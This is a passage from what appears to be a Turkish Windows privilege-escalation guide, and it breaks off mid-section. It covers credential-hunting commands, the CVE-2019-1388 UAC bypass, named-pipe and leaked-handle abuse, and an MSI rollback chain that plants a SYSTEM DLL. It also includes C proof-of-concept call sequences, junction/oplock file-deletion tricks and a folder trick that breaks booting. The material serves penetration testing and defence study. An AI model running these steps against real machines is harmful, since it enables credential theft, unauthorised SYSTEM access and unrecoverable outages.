![Tarayıcı Geçmişi - COM DLL Overwriting: Bu kayıt defterinin CLSID'leri içinde, bir DLL'yi gösteren varsayılan değer ile bir değer... içeren InProcServer32 alt anahtarını bulabilirsiniz.](<../../images/image (729).png>)

Temel olarak, çalıştırılacak **DLL'lerden herhangi birinin üzerine yazabilirseniz**, o DLL başka bir kullanıcı tarafından çalıştırıldığında **yetki yükseltebilirsiniz**.

Saldırganların COM Hijacking'i kalıcılık mekanizması olarak nasıl kullandığını öğrenmek için şuraya bakın:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Dosyalarda ve kayıt defterinde genel parola arama**

**Dosya içeriklerinde arama**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Belirli bir dosya adına sahip dosyayı arayın**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Anahtar adları ve parolalar için kayıt defterinde arama yapın**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Parolaları arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **bir msf** plugin’idir. Bu plugin’i, kurbanın içinde kimlik bilgilerini arayan tüm metasploit POST module’lerini **otomatik olarak çalıştırmak** için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) bu sayfada belirtilen parolaları içeren tüm dosyaları otomatik olarak arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden parola çıkarmak için kullanılan bir diğer harika araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) bu verileri düz metin olarak kaydeden çeşitli araçlardaki **oturumları**, **kullanıcı adlarını** ve **parolaları** arar (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Şunu hayal edin: **SYSTEM olarak çalışan bir process, tam erişimle yeni bir process açıyor** (`OpenProcess()`). Aynı process **düşük ayrıcalıklarla ancak ana process'in açık tüm handle'larını devralarak yeni bir process de oluşturuyor** (`CreateProcess()`).\
Ardından, **düşük ayrıcalıklı process'e tam erişiminiz varsa**, `OpenProcess()` ile oluşturulan **ayrıcalıklı process'e ait açık handle'ı alabilir** ve **shellcode enjekte edebilirsiniz**.\
[Bu zafiyeti **nasıl tespit edip exploit edebileceğiniz** hakkında daha fazla bilgi için bu örneği okuyun.](leaked-handle-exploitation.md)\
[Farklı izin düzeyleriyle (yalnızca tam erişim değil) devralınan process ve thread'lerin açık handle'larının nasıl test edilip kötüye kullanılacağına dair daha kapsamlı bir açıklama için bu **diğer yazıyı okuyun**.](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

**Pipe** olarak adlandırılan paylaşılan bellek segmentleri, process'ler arasında iletişim ve veri aktarımı sağlar.

Windows, ilgisiz process'lerin farklı ağlar üzerinden bile veri paylaşmasına olanak tanıyan **Named Pipes** adlı bir özellik sunar. Bu, rollerin **named pipe server** ve **named pipe client** olarak tanımlandığı bir client/server mimarisine benzer.

Bir **client** pipe üzerinden veri gönderdiğinde, pipe'ı kuran **server**, gerekli **SeImpersonate** haklarına sahipse **client'ın kimliğine bürünebilir**. Taklit edebileceğiniz bir pipe üzerinden iletişim kuran **ayrıcalıklı bir process** tespit etmek, kurduğunuz pipe ile etkileşime geçtiğinde bu process'in kimliğine bürünerek **daha yüksek ayrıcalıklar elde etme** fırsatı sunar. Böyle bir saldırıyı gerçekleştirme talimatları için yararlı kılavuzlara [**buradan**](named-pipe-client-impersonation.md) ve [**buradan**](#from-high-integrity-to-system) ulaşabilirsiniz.

Ayrıca, aşağıdaki araç bir burp benzeri araçla named pipe iletişimini **intercept etmenizi sağlar:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **ve bu araç, privesc'leri bulmak için tüm pipe'ları listeleyip görüntülemenizi sağlar** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Sunucu modundaki Telephony service (TapiSrv), `\\pipe\\tapsrv` (MS-TRP) yolunu dışarı açar. Kimliği doğrulanmış bir remote client, mailslot tabanlı async event yolunu kötüye kullanarak `ClientAttach` aracılığıyla `NETWORK SERVICE` tarafından yazılabilir mevcut herhangi bir dosyaya keyfi **4-byte write** gerçekleştirebilir, ardından Telephony admin hakları elde edip service olarak keyfi bir DLL yükleyebilir. Akışın tamamı:

- `pszDomainUser` değerini yazılabilir mevcut bir yola ayarlayarak `ClientAttach` çağırın → service, `CreateFileW(..., OPEN_EXISTING)` aracılığıyla bu yolu açar ve async event yazımları için kullanır.
- Her event, `Initialize` içindeki saldırgan denetimli `InitContext` değerini bu handle'a yazar. `LRegisterRequestRecipient` (`Req_Func 61`) ile bir line app kaydedin, `TRequestMakeCall` (`Req_Func 121`) çağrısını tetikleyin, `GetAsyncEvents` (`Req_Func 0`) aracılığıyla alın, ardından deterministik yazımları tekrarlamak için kaydı kaldırıp sistemi kapatın.
- `C:\Windows\TAPI\tsec.ini` dosyasındaki `[TapiAdministrators]` bölümüne kendinizi ekleyin, yeniden bağlanın ve ardından `GetUIDllName` çağrısına keyfi bir DLL yolu vererek `TSPI_providerUIIdentify` fonksiyonunu `NETWORK SERVICE` olarak çalıştırın.

Daha fazla ayrıntı:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Çeşitli

### Windows'ta kod çalıştırabilecek dosya uzantıları

**[https://filesec.io/](https://filesec.io/)** sayfasına göz atın.

### Markdown renderer'ları aracılığıyla Protocol handler / ShellExecute kötüye kullanımı

`ShellExecuteExW` fonksiyonuna iletilen tıklanabilir Markdown bağlantıları, tehlikeli URI handler'larını (`file:`, `ms-appinstaller:` veya kayıtlı herhangi bir scheme) tetikleyebilir ve saldırgan denetimli dosyaları mevcut kullanıcı olarak çalıştırabilir. Bakınız:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Parolalar için Command Line'ları izleme**

Bir kullanıcı olarak shell aldığınızda, **kimlik bilgilerini command line üzerinden ileten** zamanlanmış task'lar veya çalıştırılan başka process'ler olabilir. Aşağıdaki script, her iki saniyede bir process command line'larını yakalar ve mevcut durumu önceki durumla karşılaştırarak farklılıkları gösterir.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Süreçlerden parola çalma

## Düşük Yetkili Kullanıcıdan NT\AUTHORITY SYSTEM'e (CVE-2019-1388) / UAC Bypass

Grafik arayüze (konsol veya RDP üzerinden) erişiminiz varsa ve UAC etkinse, Microsoft Windows'un bazı sürümlerinde ayrıcalıksız bir kullanıcıdan terminali veya "NT\AUTHORITY SYSTEM" gibi başka bir süreci çalıştırmak mümkündür.

Bu sayede aynı güvenlik açığıyla hem ayrıcalıkları yükseltmek hem de UAC'yi atlatmak mümkündür. Ayrıca hiçbir şey yüklemeniz gerekmez ve işlem sırasında kullanılan binary, Microsoft tarafından imzalanıp yayımlanmıştır.

Etkilenen sistemlerden bazıları şunlardır:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Bu güvenlik açığından yararlanmak için aşağıdaki adımları uygulamak gerekir:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Gerekli tüm dosya ve bilgilere aşağıdaki GitHub deposundan ulaşabilirsiniz:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Administrator Medium'dan High Integrity Level'a / UAC Bypass

**Integrity Levels** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypasses** hakkında bilgi edinmek için bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Sunulan Kök Dizine Upload Directory Junctions Ekleme

Bir uygulama, öngörülebilir bir upload alt dizini oluşturabilir, çağıranın sağladığı bir dosya adını bu dizine yazabilir ve ardından dosyayı işleyebilir. Düşük ayrıcalıklı bir kullanıcı, sunucu tarafındaki yazma işleminden önce bu alt dizini kaldırıp NTFS junction ile değiştirebiliyorsa, yazma işlemi junction'ı izleyerek web sunucusunun sunduğu bir dizine yönlenebilir. Sunucu bu dosya türünü çalıştırıyorsa, buraya yerleştirilen bir script web hizmeti kimliğiyle çalışabilir. Bu, uygulamaya özgü bir keyfi yazma sınırıdır; yazılabilir bir upload dizini veya mevcut bir junction tek başına bunu kanıtlamaz.

Upload handler'daki kesin yol oluşturma mantığını ve zamanlamayı, kullanıcının alt dizindeki etkin silme/oluşturma izinlerini, hedefin etkin ACL'lerini, yazma işlemini yapan bileşenin reparse points izleyip izlemediğini ve web sunucusunun hedefteki dosyaları çalıştırıp çalıştırmadığını kontrol edin. Yazma işlemini yapan bileşenin ve web sunucusunun process identity bilgilerini ayrı ayrı doğrulayın. Pasif envanter, dizin ACL'lerini ve reparse metadata'yı gösterebilir; ancak handler'ın davranışını veya gelecekte yapılacak bir junction değişimini kanıtlayamaz. Çalıştırma bir hizmet hesabı altında gerçekleşiyorsa, ayrı bir token-privilege yolunu değerlendirmeden önce **gerçek process token'ını** inceleyin.

## WNF ile tetiklenen ayrıcalıklı scheduled-task temizliği

Manuel çalıştırmayı engelleyen bir scheduled task, yine de ayrıcalıksız bir tetikleyiciye sahip olabilir. Ayrıcalıklı bir task'ı denetlerken XML'ini dışa aktarın ve task DACL'sini, principal'ını ve action'ını incelemenin yanı sıra **tüm** trigger'ları kontrol edin. Özellikle bir `WnfStateChangeTrigger`, bir Windows Notification Facility (WNF) state'i belirtir. Bu securable state mevcut kullanıcının bir güncelleme yayınlamasına izin veriyorsa kullanıcı, `<AllowStartOnDemand>false</AllowStartOnDemand>` ayarına rağmen task'ı yapılandırılmış kimliği altında dolaylı olarak başlatabilir.<sup>[[43]](#references)</sup>

Örneğin, Recall `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` task'ı SYSTEM olarak çalışıyordu, standart bir kullanıcının WNF state `7508BCA32C079E41` için güncelleme göndermesini kabul ediyordu ve Recall devre dışı olsa bile `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}` konumunu inceliyordu.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Erişilebilirliği test etmek için `ntdll.dll` dosyasından `ZwUpdateWnfStateData` işlevini çözümleyin, sekiz baytlık state name için boş bir güncelleme gönderin ve dönüş durumunu görevin son çalıştırılma verileriyle veya Procmon etkinliğiyle ilişkilendirin. Aşağıdaki basitleştirilmiş probe, Recall görevi örneğindeki bayt dizisini kullanır; test edilen görev için dışa aktarılan baytları kullanın.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Rekursif temizliği ayrıcalıklı silme işlemine dönüştürme

Kullanışlı primitive yalnızca tetikleyici değil, saldırganın kontrol ettiği bir dizini kabul eden ayrıcalıklı bir temizleme rutinidir. İşlemi numaralandırmadan son değişikliğe kadar izleyin: profil/oturum keşfi, joker karakterlerle seçilen alt öğeler, `SHCreateItemFromParsingName` ve `IFileOperation::DeleteItem`, daha önce kontrol edilmiş bir yol adının daha sonra özyinelemeli olarak işleneceğine dair güçlü göstergelerdir. Alt öğeler güvenilir dizin tanıtıcılarına göre açılıp silinmeden önce doğrulanmıyorsa saldırgan, numaralandırma ile kullanım arasındaki çözümlemeyi değiştirebilir.<sup>[[43]](#references)</sup>

WNF tetikleyicisini aşağıda açıklanan [oplock, junction ve Object Manager symlink substitution](#from-folder-contents-delete-to-system-eop) ile eşleştirin: oplock, temizleyici meşru alt öğeyi seçtikten sonra onu duraklatır; bu sırada yazılabilir üst dizin değiştirilir ve ayrıcalıkla devam eden silme işleminin `\RPC Control` üzerinden korunan hedefe yönelmesi sağlanır. Recall zincirinde bu, belgelenen MSI rollback tekniği için gereken `C:\Config.Msi` dizininin SYSTEM tarafından silinmesini sağladı.<sup>[[31]](#references)[[43]](#references)</sup>

### İç içe alt öğeler, yüzeysel reparse-point düzeltmelerini aşar

Yalnızca saldırganın kontrolündeki kökü ve doğrudan alt öğesini doğrulamak, yol adına dayalı özyinelemeli silmeyi güvenli hâle getirmez. Kontrol edilen bu nesneleri meşru bırakıp junction/oplock substitution işlemini bunların altındaki ek bir alt öğeye taşıyın; `IFileOperation::DeleteItem` sonunda doğrulanmamış alt öğeye ulaşır ve onun yeni hedefini izler. CVE-2026-20941, ilk Recall yaması `UKP` dizinini ve GUID biçimindeki dizini doğrularken eski özyinelemeli silme işlemini koruduğu için tam olarak bu eksik düzeltme sınıfından kaynaklandı.<sup>[[43]](#references)</sup>

Güvenli yaklaşım, **her alt öğeyi** önceden güvenilen bir dizin tanıtıcısına göre açmak, son çözümlenmiş yolu/nesneyi alıp doğrulamak ve silme disposition'ını bu doğrulanmış tanıtıcıya uygulamaktır. Bir öneki doğruladıktan sonra yol adına dayalı özyinelemeli silmeye geri dönmeyin. Yama incelemesi sırasında gerçek çağrı noktasındaki yapıları da inceleyin: bu durumda `NtCreateFile` çağrısında `OBJECT_ATTRIBUTES` yapısının çalışma zamanında incelenmesi, boş olmayan bir `RootDirectory` ve göreli `{GUID}\\secure_file.lock` adını göstererek ikinci bir `FILE_DELETE_ON_CLOSE` primitive'i olduğunu düşündüren yanıltıcı decompiler çıktısını çürüttü.<sup>[[43]](#references)</sup>

## Keyfi Klasör Silme/Taşıma/Yeniden Adlandırma ile SYSTEM EoP

Teknik, bir exploit koduyla [**bu blog yazısında**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanmıştır; exploit kodu [**burada**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) mevcuttur.<sup>[[31]](#references)[[32]](#references)</sup>

Saldırı, kaldırma işlemi sırasında meşru dosyaları kötü amaçlı dosyalarla değiştirmek için Windows Installer'ın rollback özelliğini kötüye kullanır. Bunun için saldırganın, `C:\Config.Msi` klasörünü ele geçirmek üzere kullanılacak **kötü amaçlı bir MSI installer** oluşturması gerekir. Windows Installer daha sonra bu klasörü diğer MSI paketlerinin kaldırılması sırasında rollback dosyalarını depolamak için kullanır; rollback dosyaları da kötü amaçlı payload içerecek şekilde değiştirilmiş olur.

### Windows Installer COM temizleme yolu enjeksiyonu (CVE-2025-27727)

Düşük ayrıcalıklı bir istemci, `CMsiConfigurationManager` COM nesnesi (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) aracılığıyla SYSTEM `msiexec.exe` hizmetine erişebilir. Tersine mühendislik, ilgili `IMsiServer` çağrılarını vtable `0xA0` ofsetindeki `MsiBeginTransactionW`, `0xC8` ofsetindeki `SetEEUIDirectoryAndFilter` ve `0x50` ofsetindeki `CleanupTempPackages` olarak belirledi. Bu adlar ve ofsetler tersine mühendislikle elde edilmiştir ve derlemeler arasında değişiklik gösterebilir.<sup>[[41]](#references)</sup>

Yönetici olmayan bir kullanıcı için `SetEEUIDirectoryAndFilter`, sağlanan yolu `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` ve `FILE_FLAG_OPEN_REPARSE_POINT` ile açarken yalnızca çağıran kullanıcı adına çalışır. Bu, çağıranın dizini silebildiğini kanıtlar ve bir reparse point'in izlenmesini önler; ancak kontrol edilen dosya nesnesini sonraki temizleme işlemine bağlamaz veya nesnenin Windows Installer tarafından oluşturulduğunu kanıtlamaz.<sup>[[41]](#references)</sup>

`MsiBeginTransactionW` çağrısından sonra `SetEEUIDirectoryAndFilter`, çağıranın filtre argümanından bağımsız olarak yolu klasör olarak zamanlar. Hizmet, `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages` altında adlandırılmış bir `REG_DWORD` değeri yazar: değer adı çağıranın kontrol ettiği yoldur ve `0x00000002` verisi klasör bayrağıdır. Ardından `CleanupTempPackages(NULL, FALSE)` temizleme işlemine doğrudan girer. Yükseltilmiş worker, kayıt defteri değerlerini numaralandırır ve klasör girdilerini yolun kaynağını denetlemeden özyinelemeli `FDeleteFolder` işlevine iletir. Normal kaldırma başarısız olursa kod ayrıca `LockdownPath` işlevini çağırır, dosya özniteliklerini temizler ve yeniden dener.<sup>[[41]](#references)</sup>

`msi.dll` dosyasından çıkarılan asgari çağrı sırası şöyledir:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Kullanışlı primitive, junction yönlendirmesi değil, path reuse'dur. Saldırganın oluşturduğu `C:\Config.Msi` yolunu kaydedin, silin ve Windows Installer'ın daha sonra aynı pathname'i korumalı rollback verileriyle yeniden oluşturmasını bekleyin. Temizlik işlemi eski `TempPackages` adına güvenerek yeni dizini SYSTEM olarak siler. Reparse point gerekmediğinden bu yöntem, `FILE_FLAG_OPEN_REPARSE_POINT` ve yönlendirme güveni azaltımının amaçlanan sınırını aşar.<sup>[[41]](#references)</sup>

Bu silme primitive'i aşağıdaki rollback zincirine uygundur: ayrı `Installer\Folders` kaydını koruyun, korumalı `C:\Config.Msi` dizinini silin, NULL DACL ile yeniden oluşturun ve installer DACL'yi sıkılaştırmadan önce `WRITE_DAC` izni verilmiş bir handle tutun. Önceden açılmış handle, `NtSetSecurityObject` ile izin verici bir DACL'yi geri yükleyebilir; böylece rollback devam etmeden önce oluşturulan `.rbs` dosyası değiştirilebilir.<sup>[[41]](#references)</sup>

Microsoft, yeni feature gate etkin olduğunda `CMsiTransaction::SetEEUIDirectoryAndFilter` metodunun `ScheduleFileOrFolderDelete` çağırmasını engelleyerek bu yolu düzeltti. COM çağrısı yine de başarılı dönebilir, ancak saldırganın kontrolündeki path artık `TempPackages` içine eklenmez. Patch testi olarak metodun başarılı dönüşünü kullanmak yerine, Nisan 2025 Windows güvenlik güncellemelerini yükleyin.<sup>[[41]](#references)[[42]](#references)</sup>

Özetlenen teknik şu şekildedir:

1. **Aşama 1 – Hijack için Hazırlık (`C:\Config.Msi` boş bırakılır)**

- Adım 1: MSI'ı yükleyin
    - Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (ör. `dummy.txt`) yükleyen bir `.msi` oluşturun.
    - **Admin olmayan bir kullanıcının** çalıştırabilmesi için installer'ı **"UAC Compliant"** olarak işaretleyin.
    - Yükleme sonrasında dosyaya ait bir **handle** açık tutun.

- Adım 2: Uninstall işlemini başlatın
    - Aynı `.msi` dosyasını uninstall edin.
    - Uninstall işlemi dosyaları `C:\Config.Msi` dizinine taşımaya ve `.rbf` dosyaları (rollback yedekleri) olarak yeniden adlandırmaya başlar.
    - Dosyanın `C:\Config.Msi\<random>.rbf` haline geldiğini saptamak için açık dosya handle'ını `GetFinalPathNameByHandle` ile **poll edin**.

- Adım 3: Özel senkronizasyon
    - `.msi`, şu işlemleri yapan bir **özel uninstall action (`SyncOnRbfWritten`)** içerir:
        - `.rbf` dosyasının yazıldığını bildirir.
        - Ardından uninstall işlemine devam etmeden önce başka bir event'i **bekler**.

- Adım 4: `.rbf` dosyasının silinmesini engelleyin
    - Sinyal alındığında, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu, dosyanın **silinmesini engeller**.
    - Ardından uninstall işleminin tamamlanabilmesi için sinyali geri gönderin.
    - Windows Installer `.rbf` dosyasını silemez ve tüm içerikleri silemediği için **`C:\Config.Msi` kaldırılmaz**.

- Adım 5: `.rbf` dosyasını elle silin
    - `.rbf` dosyasını elle silin.
    - Artık **`C:\Config.Msi` boştur** ve hijack edilmeye hazırdır.

> Bu noktada, `C:\Config.Msi` dizinini silmek için **SYSTEM seviyesinde arbitrary folder delete vulnerability** tetikleyin.

2. **Aşama 2 – Rollback Script'lerini Kötücül Olanlarla Değiştirme**

- Adım 6: `C:\Config.Msi` dizinini zayıf ACL'lerle yeniden oluşturun
    - `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
    - **Zayıf DACL'ler** ayarlayın (ör. Everyone:F) ve `WRITE_DAC` izni olan bir handle'ı **açık tutun**.

- Adım 7: Başka bir install işlemi çalıştırın
    - `.msi` dosyasını yeniden yükleyin ve şu değerleri kullanın:
        - `TARGETDIR`: Yazılabilir konum.
        - `ERROROUT`: Zorunlu bir hatayı tetikleyen değişken.
    - Bu install işlemi, `.rbs` ve `.rbf` dosyalarını yeniden okuyacak olan **rollback** işlemini tetiklemek için kullanılacaktır.

- Adım 8: `.rbs` dosyasını izleyin
    - Yeni bir `.rbs` dosyası görünene kadar `C:\Config.Msi` dizinini izlemek için `ReadDirectoryChangesW` kullanın.
    - Dosya adını alın.

- Adım 9: Rollback öncesinde senkronize edin
    - `.msi`, şu işlemleri yapan bir **özel install action (`SyncBeforeRollback`)** içerir:
        - `.rbs` oluşturulduğunda bir event'i sinyaller.
        - Ardından devam etmeden önce **bekler**.

- Adım 10: Zayıf ACL'leri yeniden uygulayın
    - `.rbs created` event'ini aldıktan sonra:
        - Windows Installer, `C:\Config.Msi` dizinine **güçlü ACL'leri yeniden uygular**.
        - Ancak `WRITE_DAC` izni olan bir handle hâlâ elinizde olduğundan **zayıf ACL'leri yeniden uygulayabilirsiniz**.

> ACL'ler **yalnızca handle açılırken denetlenir**, bu nedenle klasöre hâlâ yazabilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` dosyalarını yerleştirin
    - `.rbs` dosyasını, Windows'a şunları söyleyen **sahte bir rollback script'iyle** değiştirin:
        - `.rbf` dosyanızı (kötücül DLL) ayrıcalıklı bir konuma geri yüklemesini (ör. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - **SYSTEM seviyesinde kötücül bir payload DLL** içeren sahte `.rbf` dosyanızı bırakın.

- Adım 12: Rollback işlemini tetikleyin
    - Installer'ın devam etmesi için sync event'ini sinyalle tetikleyin.
    - Belirli bir noktada install işlemini **bilerek başarısız kılmak** için **type 19 custom action (`ErrorOut`)** yapılandırılmıştır.
    - Bu, **rollback işlemini başlatır**.

- Adım 13: SYSTEM DLL'inizi yükler
    - Windows Installer:
        - Kötücül `.rbs` dosyanızı okur.
        - `.rbf` DLL'inizi hedef konuma kopyalar.
    - Artık **SYSTEM tarafından yüklenen bir path içinde kötücül DLL'iniz** bulunur.

- Son Adım: SYSTEM kodunu çalıştırın
    - Hijack ettiğiniz DLL'i yükleyen güvenilir bir **auto-elevated binary** (ör. `osk.exe`) çalıştırın.
    - **Bitti**: Kodunuz **SYSTEM olarak** çalıştırılır.


### Arbitrary File Delete/Move/Rename'den SYSTEM EoP'ye

Ana MSI rollback tekniği (bir önceki teknik), **tüm bir klasörü** (ör. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya vulnerability'niz yalnızca **arbitrary file deletion** sağlıyorsa?

**NTFS internals**'ı istismar edebilirsiniz: her klasörde şu adla gizli bir alternate data stream bulunur:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Bu stream, klasörün **index metadata** bilgisini depolar.

Dolayısıyla, bir klasörün **`::$INDEX_ALLOCATION` stream**'ini **silerseniz**, NTFS **klasörün tamamını** dosya sisteminden kaldırır.

Bunu aşağıdaki gibi standart dosya silme API'lerini kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Bir *file* delete API’sini çağırıyor olsanız da **klasörün kendisini siler**.

### Klasör İçeriğini Silmeden SYSTEM EoP'ye
Primitive’iniz rastgele dosya/klasörleri silmenize izin vermiyor, ancak saldırganın kontrolündeki bir klasörün *içeriğini* silmenize izin veriyorsa ne olur?

1. Step 1: Bir yem klasör ve dosya oluşturun
- Oluşturun: `C:\temp\folder1`
- İçine şunu ekleyin: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` üzerine bir **oplock** koyun
- Bir ayrıcalıklı süreç `file1.txt` dosyasını silmeye çalıştığında oplock **çalıştırmayı duraklatır**.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Adım 3: SYSTEM sürecini tetikleyin (örn., `SilentCleanup`)
- Bu süreç klasörleri (örn., `%TEMP%`) tarar ve içeriklerini silmeye çalışır.
- `file1.txt` dosyasına ulaştığında **oplock tetiklenir** ve kontrolü callback'inize devreder.

4. Adım 4: Oplock callback'i içinde – silme işlemini yönlendirin

- Seçenek A: `file1.txt` dosyasını başka bir yere taşıyın
    - Bu, oplock'u bozmadan `folder1` klasörünü boşaltır.
    - `file1.txt` dosyasını doğrudan silmeyin — bu, oplock'u vaktinden önce serbest bırakır.

- Seçenek B: `folder1` klasörünü bir **junction**'a dönüştürün:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Seçenek C: `\RPC Control` içinde bir **symlink** oluştur:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Bu, klasör meta verilerini depolayan NTFS dahili akışını hedefler — bunu silmek klasörü siler.

5. Adım 5: Oplock'u serbest bırakın
- SYSTEM işlemi devam eder ve `file1.txt` dosyasını silmeye çalışır.
- Ancak şimdi junction + symlink nedeniyle aslında silinen:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Sonuç**: `C:\Config.Msi`, SYSTEM tarafından silinir.

### İstediğiniz Bir Klasörü Oluşturmadan Kalıcı DoS'a

**SYSTEM/admin olarak istediğiniz bir klasörü oluşturmanıza** olanak tanıyan bir primitive'den yararlanın — **dosya yazamıyor** veya **zayıf izinler ayarlayamıyor** olsanız bile.

**Kritik bir Windows driver'ının** adıyla bir **klasör** (dosya değil) oluşturun. Örneğin:
```
C:\Windows\System32\cng.sys
```

- Bu yol normalde `cng.sys` kernel-mode driver'ına karşılık gelir.
- **Önceden klasör olarak oluşturursanız**, Windows önyükleme sırasında gerçek driver'ı yükleyemez.
- Ardından Windows, önyükleme sırasında `cng.sys` dosyasını yüklemeye çalışır.
- Klasörü görür, **gerçek driver'ı çözümlenemez** ve **önyükleme çöker veya durur**.
- Harici müdahale (ör. önyükleme onarımı veya diske erişim) olmadan **fallback yoktur** ve **kurtarma mümkün değildir**.

### Ayrıcalıklı log/yedekleme yollarından ve OM symlink'lerinden keyfi dosya üzerine yazmaya / önyükleme DoS'una

**Ayrıcalıklı bir servis**, **yazılabilir bir config** dosyasından okuduğu yola log/dışa aktarma verisi yazdığında, bu yolu **Object Manager symlinks + NTFS mount points** ile yönlendirerek ayrıcalıklı yazma işlemini keyfi bir dosyanın üzerine yazmaya dönüştürebilirsiniz (SeCreateSymbolicLinkPrivilege olmadan bile).<sup>[[15]](#references)</sup>

**Gereksinimler**
- Hedef yolu saklayan config dosyası saldırgan tarafından yazılabilir olmalı (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` dizinine bir mount point ve bir OM file symlink oluşturabilme olanağı (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Bu yola yazan ayrıcalıklı bir işlem (log, dışa aktarma, rapor).

**Örnek zincir**
